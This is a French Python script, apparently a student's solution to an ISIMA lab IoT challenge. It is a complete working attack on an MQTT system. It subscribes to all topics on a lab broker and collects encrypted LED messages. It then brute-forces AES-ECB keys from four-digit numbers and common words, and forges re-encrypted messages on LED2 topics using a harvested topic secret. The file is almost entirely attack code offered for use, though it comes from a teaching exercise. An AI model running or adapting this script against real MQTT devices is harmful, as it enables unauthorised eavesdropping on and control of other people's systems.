from Crypto.Cipher import AES
import paho.mqtt.client as mqtt
import time
from collections import Counter

BASE64_ALPHABET = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

# Configuration MQTT
IP = "172.16.32.7"
PORT = 10801
GROUPE = "GROUPE_BOURGEOIS_JULIA"

# Topic d'écoute global
TOPIC_ECOUTE = "/ISIMA/#"

# Stockage des données collectées
collected_data = {
    'topics': set(),
    'secrets': set(),
    'groupes': set(),
    'ciphertexts': [],
    'topic_to_cipher': {}
}

# Variables globales pour la clé trouvée
cle_aes_trouvee = None
secret_trouve = None

# ============================================================================
# FONCTIONS DE DÉCODAGE
# ============================================================================

def DecodeBase64(strMessage):
    if isinstance(strMessage, str):
        strMessage = strMessage.encode('ascii')
    decoded_bytes = bytearray()
    for i in range(0, len(strMessage), 4):
        chunk = strMessage[i:i+4]
        pad = chunk.count(b'=')
        chunk = chunk.rstrip(b'=')
        bits = 0
        for c in chunk:
            bits = (bits << 6) + BASE64_ALPHABET.index(c)
        bits <<= 6 * pad
        num_bytes = len(chunk) - 1 + pad
        for j in range(16, 16 - 8 * (3 - pad), -8):
            decoded_bytes.append((bits >> j) & 0xFF)
    return bytes(decoded_bytes)

def EncodeBase64(tabMessage):
    result = bytearray()
    padding = 0
    for i in range(0, len(tabMessage), 3):
        chunk = tabMessage[i:i+3]
        if len(chunk) < 3:
            padding = 3 - len(chunk)
            chunk += b'\x00' * padding
        bits = (chunk[0] << 16) + (chunk[1] << 8) + chunk[2]
        for j in range(18, -1, -6):
            index = (bits >> j) & 0x3F
            result.append(BASE64_ALPHABET[index])
    if padding:
        result = result[:-padding] + b'=' * padding
    return bytes(result)

def DecodeAES_ECB(strMessage, tabKey):
    if len(tabKey) != 16:
        raise ValueError("La clé doit contenir exactement 16 octets")
    
    key_bytes = bytes(tabKey)
    
    if len(strMessage) % AES.block_size != 0:
        raise ValueError(f"Le ciphertext doit avoir une longueur multiple de {AES.block_size}")
    
    cipher = AES.new(key_bytes, AES.MODE_ECB)
    decrypted_bytes = cipher.decrypt(strMessage)
    
    return decrypted_bytes.rstrip(b' ')

def EncodeAES_ECB(strMessage, tabKey):
    if len(tabKey) != 16:
        raise ValueError("La clé doit contenir exactement 16 octets")
    
    key_bytes = bytes(tabKey)
    cipher = AES.new(key_bytes, AES.MODE_ECB)
    
    if isinstance(strMessage, str):
        message_bytes = strMessage.encode('utf-8')
    else:
        message_bytes = bytes(strMessage)
    
    if len(message_bytes) % 16 != 0:
        padding_len = 16 - (len(message_bytes) % 16)
        message_bytes += b' ' * padding_len
    
    return cipher.encrypt(message_bytes)

def EstImprimable(caractere):
    c_imprimables = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\]^_`{|}~ "
    return caractere in c_imprimables

# ============================================================================
# FONCTION DE BRUTE FORCE AES
# ============================================================================

def brute_force_aes(ciphertext):
    """Brute force sur des clés courtes communes"""
    print("\n🔓 Début du brute force AES...")
    
    # Test 1: Clés numériques 4 chiffres (0000-9999)
    print("📌 Test des clés numériques (0000-9999)...")
    for i in range(10000):
        if i % 500 == 0:
            print(f"   Progression: {i}/10000", end='\r')
        
        cle_str = f"{i:04d}"
        cle = cle_str.encode() + b'\x00' * 12  # Padding à 16 octets
        
        try:
            result = DecodeAES_ECB(ciphertext, cle)
            # Vérifier si contient OFF ou ON
            result_str = result.decode('utf-8', errors='ignore').strip()
            if result_str in ["OFF", "ON"] or (len(result_str) <= 4 and all(EstImprimable(c) for c in result_str)):
                print(f"\n✅ CLÉ TROUVÉE : '{cle_str}'")
                print(f"   Message déchiffré: '{result_str}'")
                return cle
        except:
            pass
    
    print("\n📌 Test des mots courants...")
    # Test 2: Mots courants
    mots = ["OFF", "ON", "LED", "ISIMA", "IOT", "1234", "0000", "TEST", 
            "ADMIN", "PASSWORD", "SECRET", "KEY", "CHALLENGE", "DEFI",
            "MQTT", "AES", "CRYPTO", "HACK"]
    
    for mot in mots:
        print(f"   Teste: {mot}", end='\r')
        cle = mot.encode()
        if len(cle) < 16:
            cle = cle + b'\x00' * (16 - len(cle))
        elif len(cle) > 16:
            cle = cle[:16]
        
        try:
            result = DecodeAES_ECB(ciphertext, cle)
            result_str = result.decode('utf-8', errors='ignore').strip()
            if result_str in ["OFF", "ON"] or all(EstImprimable(c) for c in result_str):
                print(f"\n✅ CLÉ TROUVÉE : '{mot}'")
                print(f"   Message déchiffré: '{result_str}'")
                return cle
        except:
            pass
    
    print("\n❌ Clé non trouvée avec les méthodes simples")
    return None

# ============================================================================
# CALLBACKS MQTT
# ============================================================================

def on_connect(client, userdata, flags, rc, properties):
    print("✅ Connecté au broker MQTT => " + mqtt.connack_string(rc))
    client.connected = (rc == 0)

def on_subscribe(client, userdata, mid, granted_qos):
    print("✅ Abonné au topic - mid: " + str(mid))

def on_message(client, userdata, msg):
    global collected_data, cle_aes_trouvee, secret_trouve
    
    # Affichage compact
    print(f"\n📩 {msg.topic}")
    
    # Extraire les informations du topic
    parties = msg.topic.split('/')
    
    # Récupérer le SECRET depuis le topic
    if len(parties) >= 3:
        secret_part = parties[2]  # /ISIMA/SECRET_XXX/...
        collected_data['secrets'].add(secret_part)
        if secret_trouve is None and secret_part != "SECRET_ZZZ":
            secret_trouve = secret_part
            print(f"🔑 SECRET trouvé dans topic: {secret_part}")
    
    # Récupérer le groupe
    if len(parties) >= 6:
        groupe_part = parties[5]  # /ISIMA/.../GROUPE_XXX/...
        collected_data['groupes'].add(groupe_part)
    
    collected_data['topics'].add(msg.topic)
    
    # Vérifier si on a réussi
    if "LED2_HACKED" in msg.topic and GROUPE in msg.topic:
        client.hacked = True
        print("\n🎉🎉🎉 CHALLENGE RÉUSSI ! 🎉🎉🎉")
        return
    
    # Ignorer nos propres messages
    if GROUPE in msg.topic:
        return
    
    # Ne traiter que les messages LED1 pour analyse
    if "LED1" not in msg.topic:
        return
    
    # Décoder le payload
    try:
        decoded = DecodeBase64(msg.payload)
        print(f"   📦 Ciphertext (hex): {decoded.hex()[:32]}... ({len(decoded)} octets)")
        
        collected_data['ciphertexts'].append(decoded)
        collected_data['topic_to_cipher'][msg.topic] = decoded
        
        # Si on a déjà la clé, déchiffrer et renvoyer
        if cle_aes_trouvee is not None and secret_trouve is not None:
            try:
                plaintext = DecodeAES_ECB(decoded, cle_aes_trouvee)
                plaintext_str = plaintext.decode('utf-8', errors='ignore').strip()
                print(f"   🔓 Message clair: '{plaintext_str}'")
                
                # Construire le topic de réponse
                topic_reponse = msg.topic.replace("LED1", "LED2")
                # Remplacer le SECRET dans le topic
                for part in parties:
                    if part.startswith("SECRET_"):
                        topic_reponse = topic_reponse.replace(part, secret_trouve)
                        break
                
                # Chiffrer et encoder le même message
                ciphertext_reponse = EncodeAES_ECB(plaintext_str, cle_aes_trouvee)
                payload_reponse = EncodeBase64(ciphertext_reponse)
                
                print(f"   📤 Publication sur: {topic_reponse}")
                client.publish(topic_reponse, payload_reponse, qos=0)
                
            except Exception as e:
                print(f"   ⚠️  Erreur replay: {e}")
        
    except Exception as e:
        print(f"   ⚠️  Erreur décodage: {e}")

def on_publish(client, userdata, mid):
    print(f"   ✓ Message publié (mid: {mid})")

# ============================================================================
# SCRIPT PRINCIPAL
# ============================================================================

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=GROUPE)
client.connected = False
client.hacked = False
client.on_connect = on_connect
client.on_subscribe = on_subscribe
client.on_message = on_message
client.on_publish = on_publish

try:
    print("="*70)
    print("🎯 DÉFI 1 - Analyse et attaque du système IoT")
    print("="*70)
    
    client.connect(IP, PORT)
    print(f"🔗 Connexion à {IP}:{PORT}")
    
    print(f"👂 Écoute sur: {TOPIC_ECOUTE}")
    client.subscribe(TOPIC_ECOUTE, qos=0)
    
    client.loop_start()
    
    # Phase 1: Collection de données (20 secondes)
    print("\n" + "="*70)
    print("📡 PHASE 1: Collection de données (20 secondes)")
    print("="*70)
    time.sleep(20)
    
    # Phase 2: Analyse et brute force
    print("\n" + "="*70)
    print("🔍 PHASE 2: Analyse des données collectées")
    print("="*70)
    print(f"✓ SECRETs détectés: {collected_data['secrets']}")
    print(f"✓ Groupes détectés: {collected_data['groupes']}")
    print(f"✓ Messages capturés: {len(collected_data['ciphertexts'])}")
    
    if collected_data['ciphertexts']:
        # Trouver le message le plus fréquent (probablement "OFF")
        counter = Counter([c.hex() for c in collected_data['ciphertexts']])
        most_common_hex, count = counter.most_common(1)[0]
        print(f"\n🎯 Message le plus fréquent ({count} fois):")
        print(f"   {most_common_hex}")
        
        most_common_cipher = bytes.fromhex(most_common_hex)
        
        # Brute force
        cle_aes_trouvee = brute_force_aes(most_common_cipher)
        
        if cle_aes_trouvee:
            print("\n" + "="*70)
            print("🚀 PHASE 3: Attaque active - Replay des messages")
            print("="*70)
            print(f"🔑 Clé AES: {cle_aes_trouvee.hex()}")
            if secret_trouve:
                print(f"🔐 SECRET: {secret_trouve}")
            print("\n⏳ Écoute et replay en cours...")
            
            # Continuer à écouter et rejouer les messages
            while not client.hacked:
                time.sleep(0.5)
                print(".", end="", flush=True)
        else:
            print("\n❌ Impossible de trouver la clé. Essaie:")
            print("   - D'écouter plus longtemps")
            print("   - D'étendre la plage de brute force")
    else:
        print("\n⚠️  Aucun message capturé. Vérifie la connexion MQTT.")

except ConnectionRefusedError:
    print("❌ Connexion refusée: Vérifie IP/PORT")

except KeyboardInterrupt:
    print("\n\n⏹️  Arrêt demandé par l'utilisateur")

finally:
    client.loop_stop()
    client.unsubscribe(TOPIC_ECOUTE)
    client.disconnect()
    print("\n" + "="*70)
    print("✅ Script terminé")
    print("="*70)